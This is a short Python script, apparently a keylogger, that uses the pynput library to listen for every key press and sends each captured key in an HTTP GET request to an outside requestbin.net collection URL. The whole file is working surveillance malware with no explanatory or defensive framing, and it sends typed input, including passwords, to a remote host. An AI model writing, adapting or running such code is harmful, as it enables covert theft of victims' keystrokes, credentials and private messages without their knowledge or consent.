from pynput.keyboard import Key, Listener
import requests

link = 'http://requestbin.net/r/1fgf0451'

def on_press(key):
    url = f'{link}?{key}'
    requests.get(url)

with Listener(on_press=on_press) as listener:
    listener.join()
